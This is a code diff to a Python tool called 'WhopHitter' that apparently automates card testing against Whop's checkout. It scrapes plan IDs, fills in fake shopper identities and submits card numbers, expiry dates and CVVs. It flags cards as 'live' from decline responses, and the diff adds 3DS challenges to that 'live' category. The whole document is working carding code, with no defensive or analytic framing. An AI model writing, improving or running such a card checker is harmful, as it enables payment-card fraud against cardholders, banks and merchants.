@@ -229,8 +229,8 @@ class WhopHitter:
 
                 # Plan ID (Must be authentic base62 token, not static UI strings)
                 if not cfg['plan_id']:
-                    for pl in re.findall(r'(plan_[A-Za-z0-9_]{10,28})', full_rsc):
-                        if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade']):
+                    for pl in re.findall(r'(plan_[A-Za-z0-9]{10,24})', full_rsc):
+                        if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade', 'modal', 'container']):
                             cfg['plan_id'] = pl
                             break
 
@@ -317,6 +317,17 @@ class WhopHitter:
                     result['receipt_url'] = d.get('receipt_url') or d.get('redirect_url') or self.url
                     return result
                 
+                # 3DS / Requires Action status
+                if d.get('status') in ('requires_action', 'requires_source_action') or 'next_action' in d:
+                    result['decline_code'] = '3ds_required'
+                    result['error'] = '3DS Authentication Required'
+                    result['is_live'] = True
+                    next_act = d.get('next_action', {})
+                    redirect_url = next_act.get('redirect_to_url', {}).get('url') or next_act.get('use_stripe_sdk', {}).get('stripe_js')
+                    if redirect_url:
+                        result['redirect_url'] = redirect_url
+                    return result
+                
                 # Decline codes
                 err = d.get('error') or d.get('message') or d.get('decline_code')
                 if isinstance(err, dict):
@@ -333,7 +344,7 @@ class WhopHitter:
 
                 result['decline_code'] = dec_code
                 result['error'] = msg
-                result['is_live'] = dec_code in ('insufficient_funds', 'incorrect_cvc', 'restricted_card', 'issuer_unavailable')
+                result['is_live'] = dec_code in ('insufficient_funds', 'incorrect_cvc', 'restricted_card', 'issuer_unavailable', '3ds_required')
                 return result
         except Exception:
             pass
@@ -341,6 +352,12 @@ class WhopHitter:
         text_low = text.lower()
         if any(term in text_low for term in ['payment successful', 'order confirmed', 'thank you for your purchase', 'membership active', 'access granted']):
             result['success'] = True
+            return result
+
+        if any(term in text_low for term in ['3d secure', '3ds', 'requires_action', 'authenticate']):
+            result['decline_code'] = '3ds_required'
+            result['error'] = '3DS Authentication Required'
+            result['is_live'] = True
             return result
 
         if 'insufficient funds' in text_low:
@@ -402,18 +419,26 @@ class WhopHitter:
                         curr_country = random.choice(['US', 'GB', 'CA', 'AU'])
 
                 shopper = _generate_random_shopper(curr_country)
-                yr = card['year'] if len(card['year']) == 4 else f"20{card['year']}"
-                yr_short = yr[-2:]
+                
+                # Sanitize expiration dates safely
+                clean_m = re.sub(r'\D', '', str(card.get('month', '1')))
+                exp_month_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
+                
+                clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
+                if len(clean_y) == 2:
+                    exp_year_int = int(f"20{clean_y}")
+                else:
+                    exp_year_int = int(clean_y) if clean_y else 2028
 
                 # 1. Direct API checkout submission
                 api_body = {
                     "payment_method": {
                         "type": "card",
                         "card": {
-                            "number": card['card'],
-                            "exp_month": int(card['month']),
-                            "exp_year": int(yr),
-                            "cvc": card['cvv'],
+                            "number": re.sub(r'\D', '', str(card['card'])),
+                            "exp_month": exp_month_int,
+                            "exp_year": exp_year_int,
+                            "cvc": str(card['cvv']).strip(),
                         },
                         "billing_details": {
                             "name": shopper['full_name'],
